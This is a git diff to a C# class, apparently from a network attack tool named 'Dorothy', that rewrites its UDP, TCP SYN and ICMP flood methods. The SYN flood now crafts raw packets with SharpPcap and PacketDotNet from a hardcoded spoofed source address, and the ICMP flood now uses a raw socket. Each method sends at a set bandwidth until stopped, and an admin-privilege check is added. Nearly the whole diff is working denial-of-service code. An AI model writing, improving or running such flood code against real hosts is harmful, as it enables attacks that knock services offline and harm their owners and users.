@@ -5,6 +5,10 @@ using System.Text;
 using System.Threading;
 using System.Net.NetworkInformation;
 using System.Threading.Tasks;
+using System.Diagnostics; // Added for Stopwatch
+using System.Security.Principal; // Added for WindowsIdentity and WindowsPrincipal
+using SharpPcap;
+using PacketDotNet;
 
 namespace Dorothy
 {
@@ -62,10 +66,13 @@ namespace Dorothy
                                 if (actualMbps > mbps)
                                 {
                                     log($"Debug: Rate exceeded, sleeping for 10ms");
-                                    Thread.Sleep(10);
+                                    await Task.Delay(10);
                                 }
                             }
-                            await Task.Delay(1); // Add this line to make the loop truly asynchronous
+
+                            // Calculate the delay needed to match the desired Mbps
+                            double delay = (buffer.Length * 8.0 / (mbps * 1_000_000.0)) * 1000.0;
+                            await Task.Delay((int)delay);
                         }
                     }
                 }
@@ -78,118 +85,251 @@ namespace Dorothy
                 {
                     log("Debug: UDP Flood attack stopped.");
                 }
+
+                return Task.CompletedTask;
             });
         }
 
         // Method to start the TCP SYN flood
-        public void StartTcpSynFlood(string targetIp, int targetPort, int mbps, Action<string> log)
+        public Task StartTcpSynFlood(string targetIp, int targetPort, int mbps, Action<string> log)
         {
             _stopAttack = false;
-            new Thread(() =>
+            log($"Debug: Entering StartTcpSynFlood method");
+
+            return Task.Run(() =>
             {
+                IInjectionDevice? device = null; // Declare device outside try block
+
                 try
                 {
-                    IPEndPoint targetEndpoint = new IPEndPoint(IPAddress.Parse(targetIp), targetPort);
-                    byte[] buffer = new byte[1024]; // Dummy buffer for TCP packet simulation
+                    var devices = CaptureDeviceList.Instance;
+                    if (devices.Count < 1)
+                    {
+                        log("Error: No devices were found on this machine");
+                        return Task.CompletedTask;
+                    }
+
+                    device = devices[0] as IInjectionDevice; // Attempt to cast to IInjectionDevice
+                    if (device == null)
+                    {
+                        log("Error: Selected device is not an injection device or is null");
+                        return Task.CompletedTask;
+                    }
+
+                    device.Open(DeviceModes.Promiscuous, 1000);
+
+                    var srcIp = IPAddress.Parse("192.168.1.100");
+                    if (!IPAddress.TryParse(targetIp, out IPAddress? dstIp))
+                    {
+                        log($"Error: Invalid target IP address: {targetIp}");
+                        return Task.CompletedTask;
+                    }
+                    var srcPort = 12345;
 
                     long packetsSent = 0;
+                    long bytesPerSecond = mbps * 125000L;
                     long bytesSent = 0;
-                    long targetBytesPerSecond = mbps * 125000L;
                     DateTime startTime = DateTime.Now;
+
+                    log($"Debug: TCP SYN Flood initialized. Target: {targetIp}:{targetPort}, BytesPerSecond: {bytesPerSecond}");
 
                     while (!_stopAttack)
                     {
                         try
                         {
-                            using (Socket tcpSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp))
+                            EthernetPacket ethernetPacket = new EthernetPacket(
+                                device.MacAddress, 
+                                PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF"), 
+                                EthernetType.IPv4
+                            );
+
+                            IPv4Packet ipPacket = new IPv4Packet(srcIp, dstIp)
                             {
-                                tcpSocket.Connect(targetEndpoint);
-                                tcpSocket.Send(buffer);
-                                packetsSent++;
-                                bytesSent += buffer.Length;
-                                tcpSocket.Close();
+                                TimeToLive = 64,
+                                Protocol = PacketDotNet.ProtocolType.Tcp // Fully qualified ProtocolType
+                            };
+
+                            TcpPacket tcpPacket = new TcpPacket((ushort)srcPort, (ushort)targetPort)
+                            {
+                                SequenceNumber = 100,
+                                WindowSize = 8192,
+                                Flags = PacketDotNet.TcpFlags.Syn // Fully qualified TcpFlags
+                            };
+
+                            ipPacket.PayloadPacket = tcpPacket;
+                            ethernetPacket.PayloadPacket = ipPacket;
+
+                            device.SendPacket(ethernetPacket);
+                            packetsSent++;
+                            bytesSent += ethernetPacket.Bytes.Length;
+
+                            if (packetsSent % 1000 == 0) // Log every 1000 packets
+                            {
+                                log($"Debug: TCP SYN Flood: {packetsSent} packets sent");
                             }
-                        }
-                        catch (SocketException)
-                        {
-                            log("Unable to connect for TCP SYN flood");
-                        }
 
-                        if ((DateTime.Now - startTime).TotalSeconds >= 1)
-                        {
-                            log($"TCP SYN Flood: {packetsSent} packets sent at {mbps} Mbps");
-                            startTime = DateTime.Now;
-                            packetsSent = 0;
-                            bytesSent = 0;
-                        }
+                            if (bytesSent >= bytesPerSecond || (DateTime.Now - startTime).TotalSeconds >= 1)
+                            {
+                                double elapsedSeconds = (DateTime.Now - startTime).TotalSeconds;
+                                double actualMbps = (bytesSent * 8.0 / 1_000_000.0) / elapsedSeconds;
+                                log($"Debug: TCP SYN Flood: {packetsSent} packets sent, {actualMbps:F2} Mbps");
 
-                        if (bytesSent >= targetBytesPerSecond)
+                                startTime = DateTime.Now;
+                                bytesSent = 0;
+                                packetsSent = 0;
+
+                                if (actualMbps > mbps)
+                                {
+                                    log($"Debug: Rate exceeded, sleeping for 10ms");
+                                    Thread.Sleep(10);
+                                }
+                            }
+
+                            // Calculate the delay needed to match the desired Mbps
+                            double delay = (ethernetPacket.Bytes.Length * 8.0 / (mbps * 1_000_000.0)) * 1000.0;
+                            Thread.Sleep((int)delay);
+                        }
+                        catch (Exception ex)
                         {
-                            Thread.Sleep(1000);
-                            bytesSent = 0;
+                            log($"TCP SYN Flood error: {ex.Message}");
                         }
                     }
                 }
                 catch (Exception ex)
                 {
-                    log("TCP SYN Flood error: " + ex.Message);
+                    log($"TCP SYN Flood error: {ex.Message}");
                 }
-            }).Start();
+                finally
+                {
+                    log("Debug: TCP SYN Flood attack stopped.");
+                    device?.Close(); // Safely close the device if it's not null
+                }
+
+                return Task.CompletedTask;
+            });
         }
 
         // Method to start the ICMP flood
-        public void StartIcmpFlood(string targetIp, int mbps, Action<string> log)
+        public Task StartIcmpFlood(string targetIp, int mbps, Action<string> log)
         {
             _stopAttack = false;
-            new Thread(() =>
+            log($"Debug: Entering StartIcmpFlood method");
+
+            return Task.Run(async () =>
             {
                 try
                 {
-                    using (Ping pingSender = new Ping())
+                    log($"Debug: Creating raw socket for ICMP");
+                    using (Socket icmpSocket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Icmp))
                     {
-                        byte[] buffer = Encoding.ASCII.GetBytes(new string('A', 32)); // ICMP packet payload
-                        PingOptions options = new PingOptions();
+                        IPEndPoint targetEndpoint = new IPEndPoint(IPAddress.Parse(targetIp), 0);
+                        byte[] buffer = new byte[1024]; // 1KB packet size
+                        new Random().NextBytes(buffer); // Fill buffer with random data
+                        log($"Debug: Buffer created with size: {buffer.Length}");
+
                         long packetsSent = 0;
+                        long bytesPerSecond = mbps * 125000L; // Convert Mbps to bytes per second
                         long bytesSent = 0;
-                        long targetBytesPerSecond = mbps * 125000L;
                         DateTime startTime = DateTime.Now;
+
+                        log($"Debug: ICMP Flood initialized. Target: {targetIp}, BytesPerSecond: {bytesPerSecond}");
 
                         while (!_stopAttack)
                         {
-                            PingReply reply = pingSender.Send(targetIp, 1000, buffer, options);
-                            if (reply.Status == IPStatus.Success)
+                            try
                             {
+                                icmpSocket.SendTo(buffer, targetEndpoint);
                                 packetsSent++;
                                 bytesSent += buffer.Length;
                             }
-
-                            if ((DateTime.Now - startTime).TotalSeconds >= 1)
+                            catch (SocketException ex)
                             {
-                                log($"ICMP Flood: {packetsSent} packets sent at {mbps} Mbps");
-                                startTime = DateTime.Now;
-                                packetsSent = 0;
-                                bytesSent = 0;
+                                log($"ICMP Flood error: {ex.Message}");
                             }
 
-                            if (bytesSent >= targetBytesPerSecond)
+                            if (packetsSent % 1000 == 0) // Log every 1000 packets
                             {
-                                Thread.Sleep(1000);
+                                log($"Debug: ICMP Flood: {packetsSent} packets sent");
+                            }
+
+                            if (bytesSent >= bytesPerSecond || (DateTime.Now - startTime).TotalSeconds >= 1)
+                            {
+                                double elapsedSeconds = (DateTime.Now - startTime).TotalSeconds;
+                                double actualMbps = (bytesSent * 8.0 / 1_000_000.0) / elapsedSeconds;
+                                log($"Debug: ICMP Flood: {packetsSent} packets sent, {actualMbps:F2} Mbps");
+
+                                startTime = DateTime.Now;
                                 bytesSent = 0;
+                                packetsSent = 0;
+
+                                if (actualMbps > mbps)
+                                {
+                                    log($"Debug: Rate exceeded, sleeping for 10ms");
+                                    await Task.Delay(10);
+                                }
+                            }
+
+                            // Calculate the delay needed to match the desired Mbps
+                            double delay = (buffer.Length * 8.0 / (mbps * 1_000_000.0)) * 1000.0;
+                            if (delay > 0)
+                            {
+                                await Task.Delay((int)delay);
                             }
                         }
                     }
                 }
                 catch (Exception ex)
                 {
-                    log("ICMP Flood error: " + ex.Message);
+                    log($"Debug: ICMP Flood error: {ex.Message}");
+                    log($"Debug: Stack trace: {ex.StackTrace}");
+                    return Task.CompletedTask;
                 }
-            }).Start();
+                finally
+                {
+                    log("Debug: ICMP Flood attack stopped.");
+                }
+
+                return Task.CompletedTask;
+            });
         }
 
-        // Method to stop the attack
+        private string? GetLocalIpAddress(SharpPcap.LibPcap.LibPcapLiveDevice? device)
+        {
+            if (device == null)
+                return null;
+
+            var addresses = device.Addresses;
+            foreach (var addr in addresses)
+            {
+                if (addr.Addr.ipAddress != null && addr.Addr.ipAddress.AddressFamily == AddressFamily.InterNetwork)
+                {
+                    return addr.Addr.ipAddress.ToString();
+                }
+            }
+            return null;
+        }
+
+        private int GetAvailablePort()
+        {
+            var listener = new TcpListener(IPAddress.Any, 0);
+            listener.Start();
+            int port = ((IPEndPoint)listener.LocalEndpoint).Port;
+            listener.Stop();
+            return port;
+        }
+
         public void StopAttack()
         {
             _stopAttack = true;
+        }
+
+        private bool IsRunningAsAdmin()
+        {
+            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
+            {
+                WindowsPrincipal principal = new WindowsPrincipal(identity);
+                return principal.IsInRole(WindowsBuiltInRole.Administrator);
+            }
         }
     }
 }
